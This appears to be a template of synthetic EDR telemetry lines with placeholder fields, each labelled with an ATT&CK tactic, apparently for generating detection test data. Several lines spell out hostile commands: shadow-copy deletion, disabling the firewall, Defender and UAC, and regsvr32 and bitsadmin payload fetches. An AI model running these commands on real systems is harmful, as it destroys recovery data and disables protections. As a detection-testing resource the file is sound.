type=ingress.event.process event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" cmdline="{cmdline}" parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="{parent_path_cb}" username={username_cb} md5={md5_hash} sha256={sha256_hash_cb} Tactic=Execution Technique=PowerShell Command="{powershell_encoded}"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={netconn_ip} remote_port={netconn_port} protocol=TCP direction=outbound domain={domain_cb} Tactic=C2 Technique=Proxy DestinationReputation=Malicious
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="{file_path_cb}.{ransom_ext}" action=WRITE Tactic=Impact Technique=Data Encrypted for Impact msg="File encrypted/renamed by potential ransomware"
type=ingress.event.regmod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} reg_path="{reg_path_cb}\Run" reg_value="{reg_value_cb}" action=SET_VALUE Tactic=Persistence Technique=Registry Run Keys msg="Registry Run key created/modified"
type=ingress.event.childproc event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="{parent_path_cb}" child_guid={child_guid_cb} child_pid={child_pid_cb} child_path="c:\windows\system32\lsass.exe" child_cmdline="lsass.exe" username=SYSTEM Tactic=CredentialAccess Technique=LSASS Memory Access msg="Process attempting to access LSASS" source_process_path="{source_process_path}"
type=CB_ANALYTICS_EVENT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} type=THREAT threat_id={threat_id_cb} reason="{threat_cause}" score={threat_score} confidence={confidence_cb} process_guid={process_guid_cb} target_value="{ioc_term}" policy_name="{policy_name_cb}" action={action_cb} report_name="{report_name}" Tactic="{tactic_cb}" Technique="{technique_cb}" msg="Threat detected based on IOC/Watchlist hit"
type=ingress.event.api event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} api_call=CreateRemoteThread target_process_guid={target_guid_cb} target_pid={target_pid_cb} target_path="{target_path_cb}" Tactic=DefenseEvasion Technique=Process Injection msg="Process injection detected via API call"
type=CB_DEFENSE_ALERT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} device_id={device_id_cb} alert_type=CB_ANALYTICS threat_cause="Known Malware Hash" severity={severity_cb} process_path="{process_path_cb}" file_hash={sha256_hash_cb} policy_applied={policy_name_cb} action={action_cb} status=Unresolved msg="NGAV Malware detection based on hash" malware_family="{malware_family_cb}"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={netconn_ip} remote_port=445 protocol=TCP direction=outbound domain={domain_cb} Tactic=LateralMovement Technique=SMB/Windows Admin Shares msg="Outbound SMB connection detected"
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="c:\windows\system32\drivers\etc\hosts" action=WRITE Tactic=DefenseEvasion Technique=System Network Configuration Discovery msg="Hosts file modified"
type=ingress.event.process event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="c:\windows\system32\wmic.exe" cmdline="wmic process call create notepad.exe" parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="{parent_path_cb}" username={username_cb} md5={md5_hash} sha256={sha256_hash_cb} Tactic=Execution Technique=WMI msg="Process execution via WMI"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={netconn_ip} remote_port=53 protocol=UDP direction=outbound domain={dns_query_cb} Tactic=C2 Technique=DNS msg="DNS Query to known malicious domain" DestinationReputation=Malicious QueryType=A
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="{system_log_path}" action=DELETE Tactic=DefenseEvasion Technique=Indicator Removal on Host msg="System log file deleted"
type=ingress.event.regmod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} reg_path="HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware" reg_value="1" action=SET_VALUE Tactic=DefenseEvasion Technique=Impair Defenses msg="Attempt to disable Windows Defender via registry"
type=ingress.event.childproc event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="{parent_path_cb}" child_guid={child_guid_cb} child_pid={child_pid_cb} child_path="c:\windows\system32\vssadmin.exe" child_cmdline="vssadmin.exe delete shadows /all /quiet" username=SYSTEM Tactic=Impact Technique=Inhibit System Recovery msg="Volume Shadow Copy deletion attempt"
type=CB_ANALYTICS_EVENT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} type=OBSERVED threat_id={threat_id_cb} reason="Suspicious PowerShell Command" score={threat_score} confidence={confidence_cb} process_guid={process_guid_cb} target_value="{powershell_suspicious_cmd}" policy_name="{policy_name_cb}" action=ALLOW report_name="{report_name}" Tactic="{tactic_cb}" Technique="{technique_cb}" msg="Observed suspicious PowerShell activity"
type=ingress.event.api event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} api_call=OpenProcess target_process_guid={target_guid_cb} target_pid={target_pid_cb} target_path="c:\windows\system32\lsass.exe" access_mask=PROCESS_VM_READ Tactic=CredentialAccess Technique=LSASS Memory msg="Process opening handle to LSASS with read access"
type=CB_DEFENSE_ALERT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} device_id={device_id_cb} alert_type=DEVICE_CONTROL action=BLOCK description="USB Storage Device Blocked" policy_name="{policy_name_cb}" device_instance_id="{device_instance_id}" device_vendor="{device_vendor}" device_product="{device_product}" msg="Device Control blocked USB device"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="c:\windows\system32\svchost.exe" username=SYSTEM remote_ip={netconn_ip} remote_port=3389 protocol=TCP direction=outbound domain={domain_cb} Tactic=LateralMovement Technique=RDP msg="Outbound RDP connection detected"
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="{script_path_cb}" action=CREATE Tactic=Execution Technique=Scripting msg="Script file created" file_type=PowerShellScript
type=ingress.event.process event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="c:\windows\system32\regsvr32.exe" cmdline="regsvr32.exe /s /u /i:{payload_url} scrobj.dll" parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="{parent_path_cb}" username={username_cb} md5={md5_hash} sha256={sha256_hash_cb} Tactic=DefenseEvasion Technique=Regsvr32 msg="Execution via Regsvr32 (Squiblydoo)"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={netconn_ip} remote_port={netconn_port} protocol=UDP direction=outbound domain={dns_query_cb} Tactic=C2 Technique=Dynamic DNS msg="DNS Query to Dynamic DNS provider" QueryType=A
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="{target_path_cb}" action=RENAME old_file_path="{original_path_cb}" Tactic=Impact Technique=Ransomware msg="File rename pattern consistent with ransomware"
type=ingress.event.regmod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} reg_path="HKLM\SYSTEM\CurrentControlSet\Control\Lsa" reg_value="Security Packages" action=SET_VALUE Tactic=CredentialAccess Technique=Modify Authentication Process msg="Modification of LSA Security Packages registry key"
type=ingress.event.childproc event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="c:\windows\system32\winword.exe" child_guid={child_guid_cb} child_pid={child_pid_cb} child_path="c:\windows\system32\cmd.exe" child_cmdline="cmd.exe /c {command}" username={username_cb} Tactic=Execution Technique=Exploit Public-Facing Application msg="Office application spawning command shell"
type=CB_ANALYTICS_EVENT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} type=OBSERVED threat_id={threat_id_cb} reason="Potential Lateral Movement Tool" score={threat_score} confidence={confidence_cb} process_guid={process_guid_cb} target_value="PsExec.exe" policy_name="{policy_name_cb}" action=ALLOW report_name="{report_name}" Tactic="{tactic_cb}" Technique="{technique_cb}" msg="Observed PsExec execution"
type=ingress.event.api event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} api_call=SetWindowsHookEx target_process_guid={target_guid_cb} target_pid={target_pid_cb} target_path="{target_path_cb}" Tactic=Collection Technique=Input Capture msg="Keyboard hooking detected via API call"
type=CB_DEFENSE_ALERT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} device_id={device_id_cb} alert_type=POLICY threat_cause="Application Path Blocked" severity={severity_cb} process_path="{blocked_app_path}" file_hash={sha256_hash_cb} policy_applied={policy_name_cb} action=TERMINATE status=Resolved msg="Application blocked by Deny policy" username={username_cb}
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={tor_node_ip} remote_port={netconn_port} protocol=TCP direction=outbound domain={domain_cb} Tactic=C2 Technique=TOR msg="Connection to known TOR node" DestinationReputation=Anonymizer
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="C:\ADS\file.txt:hidden_stream.exe" action=CREATE Tactic=DefenseEvasion Technique=Hide Artifacts: NTFS ADS msg="Alternate Data Stream creation detected"
type=ingress.event.process event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="c:\windows\system32\bitsadmin.exe" cmdline="bitsadmin /transfer {job_name} /download /priority high {malware_url} {download_path}" parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="{parent_path_cb}" username={username_cb} md5={md5_hash} sha256={sha256_hash_cb} Tactic=DefenseEvasion Technique=BITS Jobs msg="File download via BITSAdmin"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={netconn_ip} remote_port=53 protocol=UDP direction=outbound domain={dns_tunnel_query} Tactic=C2 Technique=Protocol Tunneling msg="Potential DNS Tunneling detected (High Query Length)" QueryLength={query_length}
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="{system_binary_path}" action=WRITE Tactic=Persistence Technique=Hijack Execution Flow msg="Modification of system binary detected" original_hash={original_hash}
type=ingress.event.regmod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} reg_path="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{legit_process_name}" reg_value="Debugger" reg_data="{malware_debugger_path}" action=SET_VALUE Tactic=Persistence Technique=Image File Execution Options Injection msg="IFEO Debugger persistence set"
type=ingress.event.childproc event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="c:\windows\explorer.exe" child_guid={child_guid_cb} child_pid={child_pid_cb} child_path="c:\users\{username_cb}\appdata\local\temp\{suspicious_exe}" child_cmdline=""{suspicious_exe}"" username={username_cb} Tactic=Execution Technique=User Execution msg="Explorer spawning executable from temp directory"
type=CB_ANALYTICS_EVENT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} type=THREAT threat_id={threat_id_cb} reason="Ransomware Behavior Detected" score={threat_score} confidence={confidence_cb} process_guid={process_guid_cb} target_value="{file_path_cb}" policy_name="{policy_name_cb}" action=TERMINATE report_name="Ransomware File Activity" Tactic="Impact" Technique="Data Encrypted for Impact" msg="Ransomware behavior detected by Analytics"
type=ingress.event.api event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} api_call=VirtualAllocEx target_process_guid={target_guid_cb} target_pid={target_pid_cb} target_path="{target_path_cb}" access_mask=MEM_COMMIT Tactic=DefenseEvasion Technique=Process Injection msg="Memory allocation in remote process detected"
type=CB_DEFENSE_ALERT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} device_id={device_id_cb} alert_type=HOST_ISOLATION action=INITIATED description="Host isolation initiated by admin {admin_user_cb}" policy_name="{policy_name_cb}" status=InProgress msg="Device network isolation started"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={netconn_ip} remote_port={irc_port} protocol=TCP direction=outbound domain={domain_cb} Tactic=C2 Technique=IRC msg="Connection to IRC port detected"
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} file_path="/etc/passwd" action=WRITE Tactic=Persistence Technique=Modify Authentication Process msg="Modification of /etc/passwd detected (Linux)"
type=ingress.event.process event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="/usr/bin/nmap" cmdline="nmap -sS -O {target_ip_range}" parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="/bin/bash" username=root md5={md5_hash} sha256={sha256_hash_cb} Tactic=Discovery Technique=Network Service Scanning msg="Nmap network scan executed"
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="/usr/bin/wget" username={username_cb} remote_ip={netconn_ip} remote_port=80 protocol=TCP direction=outbound domain={domain_cb} Tactic=Execution Technique=Ingress Tool Transfer msg="Wget used to download external file" url="{malware_url}"
type=ingress.event.filemod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="/bin/chmod" username=root file_path="/tmp/{script_name}.sh" action=EXECUTE Tactic=Execution Technique=Scripting msg="Execution permission set on script in /tmp" mode=755
type=ingress.event.regmod event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} reg_path="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" reg_value="EnableLUA" reg_data="0" action=SET_VALUE Tactic=DefenseEvasion Technique=Impair Defenses msg="UAC disabled via registry"
type=ingress.event.childproc event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} parent_guid={parent_guid_cb} parent_pid={parent_pid_cb} parent_path="{parent_path_cb}" child_guid={child_guid_cb} child_pid={child_pid_cb} child_path="c:\windows\system32\netsh.exe" child_cmdline="netsh advfirewall set currentprofile state off" username=SYSTEM Tactic=DefenseEvasion Technique=Impair Defenses msg="Windows Firewall disabled via netsh"
type=CB_ANALYTICS_EVENT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} type=THREAT threat_id={threat_id_cb} reason="Malicious Script Execution" score={threat_score} confidence={confidence_cb} process_guid={process_guid_cb} target_value="{script_path_cb}" policy_name="{policy_name_cb}" action=TERMINATE report_name="Malicious VBS Script" Tactic="Execution" Technique="Scripting" msg="Malicious script execution detected and terminated" interpreter="cscript.exe"
type=ingress.event.api event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} api_call=NtWriteVirtualMemory target_process_guid={target_guid_cb} target_pid={target_pid_cb} target_path="{target_path_cb}" Tactic=DefenseEvasion Technique=Process Injection msg="Writing to remote process memory detected"
type=CB_DEFENSE_ALERT event_id={alert_id} timestamp={cb_timestamp} hostname={hostname_cb} device_id={device_id_cb} alert_type=RANSOMWARE threat_cause="File Encryption Activity" severity=Critical process_path="{process_path_cb}" file_path="{file_path_cb}" policy_applied={policy_name_cb} action=KILL status=Resolved msg="Ransomware file encryption behavior stopped" username={username_cb}
type=ingress.event.netconn event_id={event_id} timestamp={cb_timestamp} hostname={hostname_cb} process_guid={process_guid_cb} pid={process_pid_cb} path="{process_path_cb}" username={username_cb} remote_ip={netconn_ip} remote_port=22 protocol=TCP direction=outbound domain={domain_cb} Tactic=LateralMovement Technique=SSH msg="Outbound SSH connection detected"